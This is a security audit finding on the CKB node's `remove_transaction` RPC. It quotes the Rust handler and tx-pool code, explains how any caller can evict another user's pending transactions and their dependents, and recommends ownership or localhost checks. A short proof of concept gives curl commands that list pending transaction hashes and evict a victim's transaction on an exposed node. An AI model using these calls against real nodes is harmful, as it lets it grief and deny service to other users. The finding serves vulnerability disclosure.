### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Another User's Pending Transaction Without Ownership Check — (File: `rpc/src/module/pool.rs`)

### Summary

The `remove_transaction` RPC method in CKB's Pool module removes any pending transaction from the tx-pool given only its hash. There is no check that the caller is the submitter or owner of the cells being spent. Any RPC-reachable caller — including an unprivileged external client when the node operator has bound the RPC to a non-loopback address — can silently evict another user's pending transaction and all its dependents, with no authentication or authorization gate at the handler level.

### Finding Description

`PoolRpcImpl::remove_transaction` in `rpc/src/module/pool.rs` (line 662) accepts a bare `tx_hash` and immediately forwards it to `tx_pool.remove_local_tx`:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

`TxPoolController::remove_local_tx` dispatches a `RemoveLocalTx` message to the pool service, which calls `TxPoolService::remove_tx`. That function removes the entry from the verify queue, the orphan pool, and the main pool map — cascading to all dependent transactions — without any identity check:

```rust
pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
    let id = ProposalShortId::from_tx_hash(&tx_hash);
    { let mut queue = self.verify_queue.write().await;
      if queue.remove_tx(&id).is_some() { return true; } }
    { let mut orphan = self.orphan.write().await;
      if orphan.remove_orphan_tx(&id).is_some() { return true; } }
    let mut tx_pool = self.tx_pool.write().await;
    tx_pool.remove_tx(&id)
}
```

The RPC layer has no per-caller identity, no token, and no proof-of-ownership requirement. The only network-level barrier is the configured `listen_address`. The default is `127.0.0.1:8114`, but the configuration explicitly supports binding to any address, and the documentation only warns ("strongly discouraged") rather than enforcing a restriction. When a node is reachable — a common deployment pattern for public infrastructure, exchanges, or dApps — any HTTP client can call `remove_transaction` with an arbitrary hash.

The attacker does not need to know anything about the transaction beyond its hash, which is publicly observable from `get_raw_tx_pool` or from P2P relay gossip.

### Impact Explanation

- **Targeted transaction eviction**: An attacker who observes a victim's pending transaction hash (via `get_raw_tx_pool` or P2P relay) can immediately remove it and all child transactions from the pool. The victim's cells remain unspent on-chain but their pending intent is silently discarded.
- **Time-sensitive transaction griefing**: Transactions that carry `since` time-lock constraints or DAO withdrawal deadlines may miss their valid window if repeatedly evicted before confirmation.
- **Cascading removal**: Because `remove_tx` cascades to all dependents, a single call can evict an entire chain of pre-signed transactions (e.g., a payment channel setup sequence), not just one.
- **No permanent fund loss** in the base case (the transaction can be resubmitted), but repeated eviction constitutes a targeted, low-cost denial-of-service against specific users or contracts.

### Likelihood Explanation

- Any node with `listen_address` set to a non-loopback address (e.g., `0.0.0.0:8114`) is directly exploitable by any network peer.
- Public CKB nodes, block explorers, and dApp backends routinely expose the RPC port. The `get_raw_tx_pool` method on the same endpoint leaks all pending tx hashes, giving the attacker a ready target list.
- No key material, no privileged role, and no prior relationship with the victim is required — only the ability to send an HTTP POST.

### Recommendation

Add a submitter-identity check before allowing removal. Options:
1. **Record the submitter**: When `submit_local_tx` is called, store the source identity (e.g., a session token or IP-based nonce) alongside the entry. Require the same identity to call `remove_transaction`.
2. **Require a witness**: Require the caller to provide a valid signature over the tx hash using a key that controls one of the input cells, proving they are the economic owner of the transaction.
3. **Restrict the method to localhost unconditionally**: Enforce at the RPC server level that `remove_transaction` and `clear_tx_pool` are only callable from `127.0.0.1`, regardless of the configured `listen_address`.

### Proof of Concept

**Precondition**: A CKB node with `listen_address = "0.0.0.0:8114"` (or any non-loopback address). This is a supported, documented configuration.

**Step 1** — Discover victim's pending transaction hash:
```bash
curl -X POST http://<node>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'
# Returns list of all pending tx hashes
```

**Step 2** — Evict the victim's transaction (and all its dependents):
```bash
curl -X POST http://<node>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"],"id":2}'
# Returns: {"result": true}
```

**Expected outcome**: The victim's transaction is silently removed from the pool. The victim's node does not re-broadcast it. If the victim does not monitor the pool, the transaction is lost until manually resubmitted. For time-locked transactions, this window may be unrecoverable.

**Root cause lines**: [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** tx-pool/src/process.rs (L440-456)
```rust
    pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
        let id = ProposalShortId::from_tx_hash(&tx_hash);
        {
            let mut queue = self.verify_queue.write().await;
            if queue.remove_tx(&id).is_some() {
                return true;
            }
        }
        {
            let mut orphan = self.orphan.write().await;
            if orphan.remove_orphan_tx(&id).is_some() {
                return true;
            }
        }
        let mut tx_pool = self.tx_pool.write().await;
        tx_pool.remove_tx(&id)
    }
```

**File:** tx-pool/src/service.rs (L272-275)
```rust
    /// Remove tx from tx-pool
    pub fn remove_local_tx(&self, tx_hash: Byte32) -> Result<bool, AnyError> {
        send_message!(self, RemoveLocalTx, tx_hash)
    }
```
